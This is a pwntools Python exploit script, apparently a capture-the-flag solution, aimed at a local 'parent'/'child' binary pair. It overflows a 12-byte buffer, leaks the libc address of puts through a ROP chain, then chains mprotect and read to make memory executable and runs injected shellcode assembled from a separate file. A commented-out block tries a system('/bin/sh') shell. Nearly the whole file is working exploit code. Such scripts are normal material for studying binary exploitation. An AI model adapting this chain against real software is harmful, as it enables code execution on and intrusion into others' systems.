#!/usr/bin/python3
from pwn import *
from subprocess import run
# =========================================================
#                          SETUP                         
# =========================================================
# exe = '../dist/child' # <-- change this
# parent = '../dist/parent' # <-- change this
exe = './child' # <-- change this
parent = './parent' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'localhost', 1340 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([parent] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([parent] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)

    offset = 12
    rop.raw(b'A' * offset)
    rop.puts(elf.got['puts'])
    rop.call(elf.sym['_start'])
    io.sendlineafter(b'>', rop.chain())
    
    io.recvuntil(b'ingfo\n')
    puts = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts - libc.sym['puts']
    info(f'Libc base: {hex(libc.address)}')
    
    rop = ROP(libc)
    # making sure can't spawn shell
    # rop.raw(b'A' * offset)
    # rop.call(rop.ret.address)
    # rop.system(next(libc.search(b'/bin/sh\x00')))
    # io.sendlineafter(b'>', rop.chain())
    
    rop.raw(b'A' * offset)
    rop.call(libc.sym['mprotect'], [0x601000, 0x1000, 7])
    rop.call(libc.sym['read'], [0, 0x601100, 0x100])
    rop.call(0x601100)
    
    io.sendlineafter(b'>', rop.chain())
    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    io.sendline(shellcode)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()